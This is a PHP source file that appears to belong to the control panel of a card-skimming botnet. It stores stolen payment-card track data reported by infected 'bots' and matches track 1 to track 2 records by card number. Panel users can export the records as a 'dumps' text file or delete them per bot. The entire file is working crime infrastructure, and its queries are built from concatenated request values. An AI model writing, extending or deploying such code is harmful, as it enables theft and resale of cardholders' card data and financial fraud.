<?php
require_once("config.php");
require_once("common/commonFunctions.php");
require_once("common/dbOperations.php");

session_start();

function findTrackOne($trackTwo, $queryResult){
	$ccNumExploded = explode("=", $trackTwo);
	$ccNum = 'B'.$ccNumExploded[0];

	for ($i=0; $i<count($queryResult); $i++)
		if ($queryResult[$i]["type"] == 1 && findString($queryResult[$i]["track"], $ccNum))
			return ':'.$queryResult[$i]["track"];
	return "";
}

function getTracks($id){
	if ($id == "all")
		$query = executeQuery("SELECT track, type FROM tracks");
	else
		$query = executeQuery("SELECT track, type FROM tracks WHERE botID = '" . $id . "'");

	$result = "";

	for ($i=0; $i<count($query); $i++)
		if ($query[$i]["type"] == 2)
			$result .= $query[$i]["track"].findTrackOne($query[$i]["track"], $query).PHP_EOL;

	return $result;
}

if (isset($_POST["action"]) && isset($_POST["botID"]) && isset($_SESSION["loggedIn"]) && $_SESSION["loggedIn"] == "true"){
	$connection = connectToDB(DBSERVER, DBUSER, DBPASSWORD, DATABASE);
	if (!$connection){
		?>
			Could not connect to database!
		<?php
	}
	
	if (isset($_POST["botID"]))
		$id = filterString($_POST["botID"]);
	if (isset($_POST["track"]))
		$track = filterString($_POST["track"]);

	if ($_POST["action"] == "download"){
		header("Content-type: text/plain");
		header("Content-Disposition: attachment; filename='dumps_" . $id . ".txt'");
		echo getTracks($id);
	} else if ($_POST["action"] == "delete" || $_POST["action"] == "deleteBot" || $_POST["action"] == "deleteTrack"){
?>
<html>
	<body>
		<center>
			<form id="deleteDumps" name="deleteDumps" action="dumpActions.php" method="post">
				<input type="hidden" name="botID" value="<?php echo $id; ?>">
				<?php if (isset($_POST["track"])){ ?> <input type="hidden" name="track" value="<?php echo $track; ?>"> <?php } ?>
				<input type="hidden" name="action" value="<?php if ($_POST["action"] == "delete") echo "deleteConfirmed"; else if ($_POST["action"] == "deleteBot") echo  "deleteBotConfirmed"; else echo "deleteTrackConfirmed"; ?>">
				<table><td class="navBarUnselected"><input class="btn" type="submit" value="Confirm deletion"></td></table>
			</form>
		</center>
	</body>
</html>
<?php
	} else if ($_POST["action"] == "deleteConfirmed" || $_POST["action"] == "deleteBotConfirmed" || $_POST["action"] == "deleteTrackConfirmed"){
		if ($id == "all"){
			$query = executeQuery("DELETE FROM tracks");
			$query = executeQuery("UPDATE bots SET tracksRecievedToday = 0, tracksTotal = 0");
		} else {
			if ($_POST["action"] == "deleteTrackConfirmed" && isset($_POST["track"])){
				$query = executeQuery("DELETE FROM tracks WHERE track = '" . $track . "'");
				$query = executeQuery("UPDATE bots SET tracksRecievedToday = tracksRecievedToday - 1, tracksTotal = tracksTotal - 1 WHERE ID = '" . $id . "'");
			} else {
				$query = executeQuery("DELETE FROM tracks WHERE botID = '" . $id . "'");
				$query = executeQuery("UPDATE bots SET tracksRecievedToday = 0, tracksTotal = 0 WHERE ID = '" . $id . "'");

				if ($_POST["action"] == "deleteBotConfirmed")
					$query = executeQuery("DELETE FROM bots WHERE ID = '" . $id . "'");
			}
		}
?>
<html>
	<script type="text/javascript">history.go(-2)</script>
</html>
<?php
	}
} else
	display404();
?>